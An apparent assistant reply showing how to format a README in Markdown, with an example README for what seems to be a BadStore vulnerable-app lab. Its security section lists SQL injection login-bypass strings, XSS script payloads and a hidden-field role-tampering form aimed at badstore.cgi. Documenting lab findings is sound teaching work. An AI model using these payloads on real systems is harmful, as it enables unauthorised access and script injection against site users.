To format your README file, you can use Markdown syntax to make it more readable. Here's an example of how you might structure it:

```markdown
# Project Name

## Installation

To install the required packages, run the following command:

```bash
npm install
```

## Frontend

To run the frontend, use the following command:

```bash
npm run dev
```

## Backend

To start the backend, use the following command:

```bash
npm run start
```

## Security Considerations

### SQL Injection

#### Login to My Account
```sql
'or 1=1 or' admin' or 1=1# 
```

#### Supplier Login
```sql
admin' or 1=1# 
```

### Cross-site Scripting (XSS)

#### Password Reset
```html
</h2><script>alert(1);</script><h2> 
```

#### Supplier Upload Portal
```html
<img src=x onerror=alert(1);> 
```

#### Guestbook
```html
</h2><script>alert(1);</script><h2> 
```

### Publicly Available Directories

- `robot.txt` file
- `/supplier` directory

### Web Parameter Tampering

```html
?action=admin
<INPUT TYPE="hidden" NAME="role" VALUE="U"><INPUT TYPE="submit"
METHOD="POST" ACTION="http://{your ip address}/cgi-bin/badstore.cgi?action=register"
```

Remember to replace `{your ip address}` with the actual IP address if applicable.

Feel free to adjust the structure and formatting based on your preferences. Markdown allows you to create headings, code blocks, lists, and more to make your README clear and organized.
